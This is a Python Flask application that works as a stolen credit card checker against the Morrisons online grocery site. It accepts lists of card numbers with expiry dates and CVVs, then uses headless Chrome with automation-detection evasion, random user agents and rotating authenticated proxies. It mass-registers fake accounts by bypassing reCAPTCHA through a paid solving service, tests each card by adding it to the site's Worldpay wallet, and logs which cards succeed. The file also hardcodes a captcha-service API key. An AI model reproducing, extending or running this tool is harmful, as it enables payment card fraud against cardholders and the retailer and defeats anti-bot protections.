from flask import Flask, render_template, request, jsonify, Response, session
import threading
import queue
import time
import sys
import zipfile
import random
import uuid
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
from selenium.webdriver.chrome.service import Service
import names
from colorama import Fore
import requests
import json
import os

app = Flask(__name__)
app.secret_key = 'morrisons_checker_secret_key_2024'

# إدارة الجلسات المنفصلة لكل مستخدم
user_sessions = {}
sessions_lock = threading.Lock()

ANTICAPTCHA_API_KEY = "341e97a34b6e4ceb6916d140a345ee80"


class UserSession:
    def __init__(self, session_id):
        self.session_id = session_id
        self.is_running = False
        self.should_stop = False
        self.results_queue = queue.Queue()
        self.current_status = "idle"
        self.thread = None


def get_user_session(session_id):
    with sessions_lock:
        if session_id not in user_sessions:
            user_sessions[session_id] = UserSession(session_id)
        return user_sessions[session_id]


def cleanup_old_sessions():
    """تنظيف الجلسات القديمة غير النشطة"""
    with sessions_lock:
        to_remove = []
        for sid, sess in user_sessions.items():
            if not sess.is_running and sess.current_status == "idle":
                to_remove.append(sid)
        for sid in to_remove[:10]:  # حذف 10 جلسات قديمة كحد أقصى
            del user_sessions[sid]


def solve_recaptcha_v2_api(sitekey, page_url, api_key):
    try:
        create_task_url = "https://api.anti-captcha.com/createTask"
        task_data = {
            "clientKey": api_key,
            "task": {
                "type": "RecaptchaV2TaskProxyless",
                "websiteURL": page_url,
                "websiteKey": sitekey
            }
        }

        response = requests.post(create_task_url, json=task_data, timeout=30)
        result = response.json()

        if result.get("errorId", 0) != 0:
            pass
            return None

        task_id = result.get("taskId")
        if not task_id:
            pass
            return None

        pass

        get_result_url = "https://api.anti-captcha.com/getTaskResult"
        max_attempts = 60

        for attempt in range(max_attempts):
            time.sleep(3)

            result_data = {
                "clientKey": api_key,
                "taskId": task_id
            }

            response = requests.post(get_result_url, json=result_data, timeout=30)
            result = response.json()

            if result.get("errorId", 0) != 0:
                pass
                return None

            status = result.get("status")

            if status == "ready":
                token = result.get("solution", {}).get("gRecaptchaResponse")
                pass
                return token
            elif status == "processing":
                if attempt % 5 == 0:
                    pass
                continue
            else:
                pass
                return None

        pass
        return None

    except Exception as e:
        pass
        return None


def solve_recaptcha_on_page(driver, anticaptcha_api_key):

    try:
        pass
        time.sleep(2)

        captcha_found = False
        max_checks = 5

        for i in range(max_checks):
            try:
                selectors = [
                    "//iframe[contains(@src, 'recaptcha') and contains(@src, 'api2')]",
                    "//iframe[contains(@src, 'recaptcha')]",
                    "//div[contains(@class, 'g-recaptcha')]",
                    "//div[@data-sitekey]"
                ]

                for selector in selectors:
                    elements = driver.find_elements(By.XPATH, selector)
                    for elem in elements:
                        if elem.is_displayed():
                            captcha_found = True
                            break
                    if captcha_found:
                        break

                if captcha_found:
                    break
            except Exception as e:
                pass
            time.sleep(0.3)

        if not captcha_found:
            pass
            return True

        pass

        pass

        find_callback_script = """
        function findRecaptchaClients() {
            if (typeof (___grecaptcha_cfg) !== 'undefined') {
                return Object.entries(___grecaptcha_cfg.clients).map(([cid, client]) => {
                    const data = { id: cid, version: cid >= 10000 ? 'V3' : 'V2' };
                    const objects = Object.entries(client).filter(([_, value]) => value && typeof value === 'object');

                    objects.forEach(([toplevelKey, toplevel]) => {
                        const found = Object.entries(toplevel).find(([_, value]) => (
                            value && typeof value === 'object' && 'sitekey' in value && 'size' in value
                        ));

                        if (found) {
                            const [sublevelKey, sublevel] = found;
                            data.sitekey = sublevel.sitekey;
                            const callbackKey = data.version === 'V2' ? 'callback' : 'promise-callback';
                            const callback = sublevel[callbackKey];
                            if (!callback) {
                                data.callback = null;
                                data.function = null;
                            } else {
                                data.function = callback;
                                const keys = [cid, toplevelKey, sublevelKey, callbackKey].map((key) => `['${key}']`).join('');
                                data.callback = `___grecaptcha_cfg.clients${keys}`;
                            }
                        }
                    });
                    return data;
                });
            }
            return [];
        }
        return findRecaptchaClients();
        """

        callback_info = None
        sitekey = None
        callback_path = None

        try:
            result = driver.execute_script(find_callback_script)
            if result and len(result) > 0:
                callback_info = result[0]
                sitekey = callback_info.get('sitekey')
                callback_path = callback_info.get('callback')
                pass
                pass
        except Exception as e:
            pass

        if not sitekey:
            pass

            try:
                iframes = driver.find_elements(By.XPATH, "//iframe[contains(@src, 'recaptcha')]")
                for iframe in iframes:
                    src = iframe.get_attribute('src')
                    if 'k=' in src:
                        import re
                        match = re.search(r'k=([A-Za-z0-9_-]+)', src)
                        if match:
                            sitekey = match.group(1)
                            pass
                            break
            except Exception as e:
                pass

            if not sitekey:
                try:
                    page_source = driver.page_source
                    if 'data-sitekey="' in page_source:
                        start = page_source.find('data-sitekey="') + 14
                        end = page_source.find('"', start)
                        sitekey = page_source[start:end]
                except:
                    pass

        if not sitekey:
            pass
            return False

        pass
        page_url = driver.current_url

        token = solve_recaptcha_v2_api(sitekey, page_url, anticaptcha_api_key)
        if not token:
            pass
            return False

        pass

        time.sleep(random.uniform(1.5, 3.0))

        pass

        try:
            driver.execute_script(f"""
                var textareas = document.querySelectorAll('textarea[name="g-recaptcha-response"]');
                for (var i = 0; i < textareas.length; i++) {{
                    textareas[i].innerHTML = '{token}';
                    textareas[i].value = '{token}';
                }}
            """)
            pass

            driver.execute_script(f"""
                if (typeof ___grecaptcha_cfg !== 'undefined') {{
                    Object.keys(___grecaptcha_cfg.clients).forEach(function(key) {{
                        ___grecaptcha_cfg.clients[key][Object.keys(___grecaptcha_cfg.clients[key])[0]][Object.keys(___grecaptcha_cfg.clients[key][Object.keys(___grecaptcha_cfg.clients[key])[0]])[0]].callback('{token}');
                    }});
                }}
            """)
            pass

        except Exception as e:
            pass
            try:
                driver.execute_script(
                    f"document.getElementById('g-recaptcha-response').innerHTML = '{token}';"
                )
                pass
            except:
                pass

        pass
        time.sleep(random.uniform(2.0, 4.0))

        pass
        return True

    except Exception as e:
        pass
        return False


def load_file(filename):
    filepath = os.path.join(os.path.dirname(__file__), filename)
    if os.path.exists(filepath):
        with open(filepath, "r") as file:
            return [line.strip() for line in file if line.strip()]
    return []


user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Android 15; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65',
]


def create_chrome_driver(use_proxy=False, proxies_chrome=None, base_path=None):
    """إنشاء Chrome driver مع الإعدادات المحسنة"""
    options = webdriver.ChromeOptions()
    
    # إعدادات أساسية
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option("excludeSwitches", ['enable-automation'])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("--start-maximized")
    options.add_argument("--log-level=3")
    options.add_argument("--disable-infobars")
    options.add_argument("--silent")
    
    # إعدادات headless محسنة
    options.add_argument("--headless=new")
    options.add_argument("--window-size=1920,1080")
    
    # إعدادات للعمل في Docker/Railway
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-software-rasterizer")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-setuid-sandbox")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-renderer-backgrounding")
    options.add_argument("--disable-features=TranslateUI")
    options.add_argument("--disable-ipc-flooding-protection")
    options.add_argument("--memory-pressure-off")
    options.add_argument("--single-process")
    
    # تحديد مسار Chrome
    options.binary_location = "/usr/bin/google-chrome"
    
    # إضافة user agent عشوائي
    options.add_argument(f"--user-agent={random.choice(user_agents)}")

    # إعداد البروكسي إذا مطلوب
    if use_proxy and proxies_chrome and base_path:
        proxy = random.choice(proxies_chrome)
        proxy_parts = proxy.split(":")
        if len(proxy_parts) >= 4:
            PROXY_HOST = proxy_parts[0]
            PROXY_PORT = proxy_parts[1]
            PROXY_USER = proxy_parts[2]
            PROXY_PASS = proxy_parts[3]

            manifest_json = """
            {
                "version": "1.0.0",
                "manifest_version": 2,
                "name": "Chrome Proxy",
                "permissions": [
                    "proxy",
                    "tabs",
                    "unlimitedStorage",
                    "storage",
                    "<all_urls>",
                    "webRequest",
                    "webRequestBlocking"
                ],
                "background": {
                    "scripts": ["background.js"]
                },
                "minimum_chrome_version":"22.0.0"
            }
            """

            background_js = """
            var config = {
                    mode: "fixed_servers",
                    rules: {
                    singleProxy: {
                        scheme: "http",
                        host: "%s",
                        port: parseInt(%s)
                    },
                    bypassList: ["localhost"]
                    }
                };

            chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

            function callbackFn(details) {
                return {
                    authCredentials: {
                        username: "%s",
                        password: "%s"
                    }
                };
            }

            chrome.webRequest.onAuthRequired.addListener(
                        callbackFn,
                        {urls: ["<all_urls>"]},
                        ['blocking']
            );
            """ % (PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS)

            pluginfile = os.path.join(base_path, f'proxy_auth_plugin_{uuid.uuid4().hex[:8]}.zip')
            with zipfile.ZipFile(pluginfile, 'w') as zp:
                zp.writestr("manifest.json", manifest_json)
                zp.writestr("background.js", background_js)
            options.add_extension(pluginfile)

    # إنشاء driver مع ChromeDriver
    service = Service('/usr/local/bin/chromedriver')
    driver = webdriver.Chrome(service=service, options=options)
    
    return driver


def check_func(driver, cards, user_session, rounds=1):
    for _ in range(rounds):
        if user_session.should_stop or not cards:
            break
            
        card = cards.pop(0)
        card_parts = card.split("|")
        
        if len(card_parts) < 3:
            user_session.results_queue.put({"type": "error", "card": card, "message": "Invalid card format"})
            continue
            
        cc = card_parts[0]
        mes = card_parts[1]
        ano = card_parts[2]
        cvv = card_parts[3] if len(card_parts) > 3 else None

        try:
            driver.get('https://groceries.morrisons.com/settings/wallet')
            time.sleep(3)
            
            try:
                cook = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'onetrust-accept-btn-handler'))
                driver.execute_script("arguments[0].click();", cook)
                time.sleep(1)
            except:
                pass

            add_card = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'add-card-button'))
            driver.execute_script("arguments[0].click();", add_card)
            time.sleep(2)

            iframe = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.XPATH, "//iframe[contains(@src, 'worldpay')]"))
            driver.switch_to.frame(iframe)
            time.sleep(1)

            cc_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'cardNumber'))
            for digit in cc:
                cc_input.send_keys(digit)
                time.sleep(random.uniform(0.05, 0.15))

            mes_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'expiryMonth'))
            mes_input.send_keys(mes)

            ano_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'expiryYear'))
            ano_input.send_keys(ano)

            name_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'cardholderName'))
            name_input.send_keys(names.get_full_name())

            if cvv:
                try:
                    cvv_input = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'csc'))
                    cvv_input.send_keys(cvv)
                except:
                    pass
            else:
                try:
                    cvv_input = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'csc'))
                    driver.execute_script("arguments[0].remove();", cvv_input)
                except:
                    pass

            time.sleep(1)
            submit = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'submitButton'))
            driver.execute_script("arguments[0].click();", submit)
            time.sleep(5)

            driver.switch_to.default_content()
            time.sleep(2)

            page_source = driver.page_source.lower()
            
            if "card added" in page_source or "success" in page_source:
                user_session.results_queue.put({"type": "success", "card": card, "message": "Card Added Successfully"})
                # حفظ في ملف
                with open(os.path.join(os.path.dirname(__file__), "success.txt"), "a") as f:
                    f.write(f"{card}\n")
            else:
                user_session.results_queue.put({"type": "fail", "card": card, "message": "Card Rejected"})
                with open(os.path.join(os.path.dirname(__file__), "fail.txt"), "a") as f:
                    f.write(f"{card}\n")

        except Exception as e:
            user_session.results_queue.put({"type": "error", "card": card, "message": str(e)})
            
    return True


def login_func(driver, email):
    try:
        driver.get('https://groceries.morrisons.com/login')
        time.sleep(3)
        
        try:
            cook = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'onetrust-accept-btn-handler'))
            driver.execute_script("arguments[0].click();", cook)
            time.sleep(1)
        except:
            pass

        email_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'email'))
        email_input.send_keys(email[0])

        password_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'password'))
        password_input.send_keys(email[1] if len(email) > 1 else "AsAs@@123")

        submit = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'login-submit-button'))
        driver.execute_script("arguments[0].click();", submit)
        time.sleep(5)

        return True
    except Exception as e:
        return False


def register_func(driver):
    try:
        driver.get('https://groceries.morrisons.com/registration')
        time.sleep(3)
        
        try:
            cook = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'onetrust-accept-btn-handler'))
            driver.execute_script("arguments[0].click();", cook)
            time.sleep(1)
        except:
            pass

        newemail = f"{names.get_first_name().lower()}{random.randint(1000,9999)}@gmail.com"
        
        email_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'email'))
        email_input.send_keys(newemail)

        password_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'password'))
        password_input.send_keys("AsAs@@123")

        # حل الكابتشا
        captcha_solved = solve_recaptcha_on_page(driver, ANTICAPTCHA_API_KEY)

        if captcha_solved:
            time.sleep(3)
            try:
                submit = WebDriverWait(driver, 10).until(lambda d: d.find_element(By.ID, 'registration-submit-button'))
                driver.execute_script("arguments[0].click();", submit)
                time.sleep(5)
            except:
                pass

        WebDriverWait(driver, 60).until(lambda d: d.find_element(By.ID, 'account-button'))
        
        # حفظ الإيميل
        with open(os.path.join(os.path.dirname(__file__), "emails.txt"), 'a') as em:
            em.write(f"\n{newemail}|AsAs@@123")
            
        return newemail
    except Exception as e:
        return None


def run_checker(session_id, work_type, use_proxy, cards_data, emails_data, proxies_data):
    user_session = get_user_session(session_id)
    
    user_session.is_running = True
    user_session.should_stop = False
    user_session.current_status = "running"

    # حفظ البيانات في ملفات خاصة بالجلسة
    base_path = os.path.dirname(__file__)
    session_folder = os.path.join(base_path, f"session_{session_id[:8]}")
    os.makedirs(session_folder, exist_ok=True)
    
    with open(os.path.join(session_folder, "cards.txt"), "w") as f:
        f.write(cards_data)
    with open(os.path.join(session_folder, "emails.txt"), "w") as f:
        f.write(emails_data)
    with open(os.path.join(session_folder, "proxies.txt"), "w") as f:
        f.write(proxies_data)

    cards = [line.strip() for line in cards_data.split('\n') if line.strip()]
    emails = [line.strip() for line in emails_data.split('\n') if line.strip()]
    proxies_chrome = [line.strip() for line in proxies_data.split('\n') if line.strip()]

    while not user_session.should_stop and cards:
        driver = None
        try:
            driver = create_chrome_driver(use_proxy, proxies_chrome, session_folder)

            if emails:
                email = random.choice(emails).split("|")
            else:
                email = None

            if work_type == 'register':
                register_func(driver)
            else:
                if email:
                    login_func(driver, email)

            check_func(driver, cards, user_session, rounds=1)

        except Exception as e:
            user_session.results_queue.put({"type": "error", "card": "System", "message": str(e)})

        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass

    user_session.is_running = False
    user_session.current_status = "idle"
    user_session.results_queue.put({"type": "finished", "card": "Process finished", "message": "All cards processed"})
    
    # تنظيف الجلسات القديمة
    cleanup_old_sessions()


@app.route('/')
def index():
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    return render_template('index.html')


@app.route('/start', methods=['POST'])
def start():
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    
    session_id = session['session_id']
    user_session = get_user_session(session_id)

    if user_session.is_running:
        return jsonify({"status": "error", "message": "Already running"})

    data = request.json
    work_type = data.get('work_type', 'login')
    use_proxy = data.get('use_proxy', False)
    cards_data = data.get('cards', '')
    emails_data = data.get('emails', '')
    proxies_data = data.get('proxies', '')

    if not cards_data.strip():
        return jsonify({"status": "error", "message": "No cards provided"})

    thread = threading.Thread(target=run_checker, args=(session_id, work_type, use_proxy, cards_data, emails_data, proxies_data))
    thread.daemon = True
    thread.start()
    user_session.thread = thread

    return jsonify({"status": "success", "message": "Started", "session_id": session_id})


@app.route('/stop', methods=['POST'])
def stop():
    if 'session_id' not in session:
        return jsonify({"status": "error", "message": "No session"})
    
    user_session = get_user_session(session['session_id'])
    user_session.should_stop = True
    return jsonify({"status": "success", "message": "Stopping..."})


@app.route('/status')
def status():
    if 'session_id' not in session:
        return jsonify({"is_running": False, "status": "idle"})
    
    user_session = get_user_session(session['session_id'])
    return jsonify({"is_running": user_session.is_running, "status": user_session.current_status})


@app.route('/results')
def get_results():
    if 'session_id' not in session:
        return jsonify([])
    
    user_session = get_user_session(session['session_id'])
    results = []
    while not user_session.results_queue.empty():
        try:
            results.append(user_session.results_queue.get_nowait())
        except:
            break
    return jsonify(results)


@app.route('/stream')
def stream():
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    
    session_id = session['session_id']
    
    def generate():
        user_session = get_user_session(session_id)
        while True:
            try:
                result = user_session.results_queue.get(timeout=1)
                yield f"data: {json.dumps(result)}\n\n"
            except:
                yield f"data: {json.dumps({'type': 'ping'})}\n\n"
    
    return Response(generate(), mimetype='text/event-stream')


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
